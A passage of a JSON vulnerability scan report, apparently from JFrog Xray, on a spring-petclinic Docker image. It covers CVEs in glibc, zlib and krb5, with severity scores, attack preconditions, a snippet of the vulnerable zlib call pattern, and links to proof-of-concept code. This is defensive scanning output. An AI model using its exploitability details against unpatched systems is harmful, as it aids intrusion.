                  "details": "Offset: 0x0000ef40, Symbol: fopen, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef48, Symbol: ulckpwdf, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef50, Symbol: perror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef58, Symbol: rename, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef60, Symbol: gmtime, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef68, Symbol: strtoul, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef70, Symbol: openlog, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef78, Symbol: freecon, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef80, Symbol: link, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef88, Symbol: exit, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef90, Symbol: __fprintf_chk, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000ef98, Symbol: setuid, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efa0, Symbol: strdup, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efa8, Symbol: putpwent, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efb0, Symbol: strerror, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efb8, Symbol: sleep, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efc0, Symbol: getc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efc8, Symbol: fork, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efd0, Symbol: __ctype_b_loc, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efd8, Symbol: _ITM_deregisterTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efe0, Symbol: __libc_start_main, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000efe8, Symbol: __gmon_start__, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eff0, Symbol: _ITM_registerTMCloneTable, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000eff8, Symbol: __cxa_finalize, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000f2b0, Symbol: misc_conv, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000f748, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000f750, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000fc08, Symbol: fgets, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x0000fc10, Symbol: fputs, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010160, Symbol: stdout, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010170, Symbol: stdin, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010178, Symbol: optind, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010180, Symbol: __environ, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x00010188, Symbol: optarg, Issue Found: SETUID binaries were found"
               },
               {
                  "file_path": "/usr/bin/passwd",
                  "details": "Offset: 0x000101a0, Symbol: stderr, Issue Found: SETUID binaries were found"
               }
            ]
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc6:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2023-4911",
            "result": "applicable"
         }
      },
      {
         "id": "XRAY-533715",
         "severity": "Critical",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "MiniZip in zlib through 1.3 has an integer overflow and resultant heap-based buffer overflow in zipOpenNewFileInZip4_64 via a long filename, comment, or extra field. NOTE: MiniZip is not a supported part of the zlib product. NOTE: pyminizip through 0.2.6 is also vulnerable because it bundles an affected zlib version, and exposes the applicable MiniZip code through its compress API.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:zlib1g",
         "source_id": "deb://debian:bullseye:zlib1g",
         "source_comp_id": "deb://debian:bullseye:zlib1g:1:1.2.11.dfsg-2+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:zlib",
            "vulnerable_versions": [
               "All Versions"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-45853",
                     "cwe": [
                        "CWE-190"
                     ],
                     "cwe_details": {
                        "CWE-190": {
                           "name": "Integer Overflow or Wraparound",
                           "description": "The product performs a calculation that can produce an integer overflow or wraparound, when the logic assumes that the resulting value will always be larger than the original value. This can introduce other weaknesses when the calculation is used for resource management or execution control.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "14"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "MiniZip in zlib through 1.3 has an integer overflow and resultant heap-based buffer overflow in zipOpenNewFileInZip4_64 via a long filename, comment, or extra field. NOTE: MiniZip is not a supported part of the zlib product. NOTE: pyminizip through 0.2.6 is also vulnerable because it bundles an affected zlib version, and exposes the applicable MiniZip code through its compress API.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-533715",
            "VulnerabilityTitle": "",
            "ShortDescription": "A heap buffer overflow in zlib may lead to remote code execution when parsing a malicious archive.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nMake sure that files with names larger than 65536 characters are not parsed using `zlib`.\n\nAlso, a fix currently exists in the `develop` branch of `zlib` and can be deployed manually.",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "PoC demonstrates a heap overflow that crashes the application. Although not demonstrated, it is likely that an RCE exploit could be developed, since zip-processing may allow many heap-shaping primitives needed for a full RCE exploit.",
                  "IsPositive": 0,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "An attacker could compromise a server that is using the `zlib` library to zip or unzip any files.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact",
                  "Description": "The CVSS score does not reflect the context-dependent nature of this vulnerability.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Remote code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "An attacker must find a way to upload a crafted zip archive, that is subsequently processed by the vulnerable `zipOpenNewFileInZip4_64` function.",
                  "IsPositive": 1,
                  "InsertOrder": 5
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Pull request with fix commit",
                  "Url": "https://github.com/madler/zlib/pull/843",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OSS-Security Advisory",
                  "Url": "https://www.openwall.com/lists/oss-security/2023/10/20/9",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "Unit-tests containing Proof-of-concept",
                  "Url": "https://chromium.googlesource.com/chromium/src/+/de29dd6c7151d3cd37cb4cf0036800ddfb1d8b61%5E%21/#F4",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:zlib1g:1:1.2.11.dfsg-2+deb11u1",
            "cve_id": "CVE-2023-45853",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:zlib1g:1:1.2.11.dfsg-2+deb11u1",
            "vulnerability_id": "CVE-2023-45853",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-248452",
         "severity": "Critical",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:zlib1g",
         "source_id": "deb://debian:bullseye:zlib1g",
         "source_comp_id": "deb://debian:bullseye:zlib1g:1:1.2.11.dfsg-2+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:zlib",
            "vulnerable_versions": [
               "< 1:1.2.11.dfsg-2+deb11u2"
            ],
            "fixed_versions": [
               "1:1.2.11.dfsg-2+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-37434",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "9.8/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
                  }
               ],
               "description": "zlib through 1.2.12 has a heap-based buffer over-read or buffer overflow in inflate in inflate.c via a large gzip header extra field. NOTE: only applications that call inflateGetHeader are affected. Some common applications bundle the affected zlib source code but may be unable to call inflateGetHeader (e.g., see the nodejs/node reference).",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:26:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-248452",
            "VulnerabilityTitle": "",
            "ShortDescription": "A heap overflow in zlib can lead to remote code execution when a crafted gzip archive is processed.",
            "FullDescription": "[zlib](https://github.com/madler/zlib) is a popular general purpose data compression library.\n\nzlib supports processing gzip archives. As such, it provides the `inflateGetHeader()` method used to get the header information of a gzip archive. The header is always checked for validity, including the header CRC if present. \nWhen the `inflateGetHeader()` is called, it will make the `inflate()` method read and copy the header of a gzip in a structure passed as a parameter to the `inflateGetHeader()` method, otherwise it will discard the header. If the extra header field is big enough, it will cause the `inflate()` method to be called multiple times to get the full content of this extra field. As there is an improper extra field size check, it can cause a heap buffer overflow.\nThe vulnerability can be exploited if and only if the target program calls `inflateGetHeader()`.\nThe attacker should find a remote input that propagates to the `inflate()` method with the `inflateGetHeader()` method being called.\n\nExample:\n```\nz_stream strm;\ngz_header head;\n\nif ((r = inflateInit2(&strm, stream_size)) != Z_OK)\n\tgoto fail;\nif ((r = inflateGetHeader(&strm, &head)) != Z_OK) {\n\tinflateEnd(&strm);\n\tgoto fail;\n}\nr = inflate(&strm, Z_NO_FLUSH);\n```\nThe above code is vulnerable as it is calling the `inflateGetHeader()` method and the `inflate()` method for crafter gzip header.",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Heap overflow leading to code execution",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker must find a way to upload a crafted gzip archive, that is subsequently processed by a `inflate()` call with `inflateGetHeader()` being called before.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has an exploit published",
                  "Description": "PoC demonstrates a heap overflow that crashes the application. Although not demonstrated, it is likely that an RCE exploit could be developed, since gzip-processing may allow many heap-shaping primitives needed for a full RCE exploit.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "OSS-SEC Advisory",
                  "Url": "https://seclists.org/oss-sec/2022/q3/110",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Patch",
                  "Url": "https://cgit.freebsd.org/src/commit/sys/contrib/zlib/inflate.c?id=2969066f73fc67a614144ac09b9f3f5291937fed",
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Exploit",
                  "Title": "PoC causing a heap overflow and crashing",
                  "Url": "https://github.com/ivd38/zlib_overflow",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:zlib1g:1:1.2.11.dfsg-2+deb11u1",
            "cve_id": "CVE-2022-37434",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable library zlib is never included",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:zlib1g:1:1.2.11.dfsg-2+deb11u1",
            "vulnerability_id": "CVE-2022-37434",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607813",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libk5crypto3",
         "source_id": "deb://debian:bullseye:libk5crypto3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37371",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607813",
            "VulnerabilityTitle": "",
            "ShortDescription": "Insufficient input validation in Kerberos 5 may lead to denial of service when parsing message tokens with invalid length fields.",
            "FullDescription": "The `krb5` library is an implementation of the Kerberos Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS` tokens are part of the `Generic Security Services Application Program Interface` (GSS-API) used to provide secure communication between applications. A GSS token is essentially a chunk of data that encapsulates security information required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields, thus leading to denial of service.\n\nThe general structure of a wrap token contains a header, which includes fields such as `Extra Count`, and an encrypted part which includes the message.\n\nFor example, the vulnerability can be exploited in the following cases:\n\n* A wrap token with a 0 value for the `Extra Count` field, which is the header value for padding.\n* A wrap token with no header\n\nNote:\nThis attack rely heavily on the attacker ability to MiTM.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37371",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37371",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607813",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgssapi-krb5-2",
         "source_id": "deb://debian:bullseye:libgssapi-krb5-2",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37371",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607813",
            "VulnerabilityTitle": "",
            "ShortDescription": "Insufficient input validation in Kerberos 5 may lead to denial of service when parsing message tokens with invalid length fields.",
            "FullDescription": "The `krb5` library is an implementation of the Kerberos Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS` tokens are part of the `Generic Security Services Application Program Interface` (GSS-API) used to provide secure communication between applications. A GSS token is essentially a chunk of data that encapsulates security information required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields, thus leading to denial of service.\n\nThe general structure of a wrap token contains a header, which includes fields such as `Extra Count`, and an encrypted part which includes the message.\n\nFor example, the vulnerability can be exploited in the following cases:\n\n* A wrap token with a 0 value for the `Extra Count` field, which is the header value for padding.\n* A wrap token with no header\n\nNote:\nThis attack rely heavily on the attacker ability to MiTM.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37371",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37371",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607813",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5support0",
         "source_id": "deb://debian:bullseye:libkrb5support0",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37371",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607813",
            "VulnerabilityTitle": "",
            "ShortDescription": "Insufficient input validation in Kerberos 5 may lead to denial of service when parsing message tokens with invalid length fields.",
            "FullDescription": "The `krb5` library is an implementation of the Kerberos Version 5 protocol, which is a widely used authentication protocol that provides secure authentication over insecure networks. The library contains the tools, APIs, and utilities necessary for applications and systems to integrate Kerberos for authentication and secure communication.\n\n`GSS` tokens are part of the `Generic Security Services Application Program Interface` (GSS-API) used to provide secure communication between applications. A GSS token is essentially a chunk of data that encapsulates security information required for authentication, integrity, and confidentiality during Kerberos communication.\n\nIn MIT Kerberos 5 (aka krb5), an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields, thus leading to denial of service.\n\nThe general structure of a wrap token contains a header, which includes fields such as `Extra Count`, and an encrypted part which includes the message.\n\nFor example, the vulnerability can be exploited in the following cases:\n\n* A wrap token with a 0 value for the `Extra Count` field, which is the header value for padding.\n* A wrap token with no header\n\nNote:\nThis attack rely heavily on the attacker ability to MiTM.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The attacker must be able to intercept the communication between the application and the server.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Official fix commit",
                  "Url": "https://github.com/krb5/krb5/commit/55fbf435edbe2e92dd8101669b1ce7144bc96fef",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "cve_id": "CVE-2024-37371",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
            "vulnerability_id": "CVE-2024-37371",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-607813",
         "severity": "Critical",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libkrb5-3",
         "source_id": "deb://debian:bullseye:libkrb5-3",
         "source_comp_id": "deb://debian:bullseye:libgssapi-krb5-2:1.18.3-6+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:krb5",
            "vulnerable_versions": [
               "< 1.18.3-6+deb11u5"
            ],
            "fixed_versions": [
               "1.18.3-6+deb11u5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-37371",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v3": "9.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H"
                  }
               ],
               "description": "In MIT Kerberos 5 (aka krb5) before 1.21.3, an attacker can cause invalid memory reads during GSS message token handling by sending message tokens with invalid length fields.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-607813",
            "VulnerabilityTitle": "",
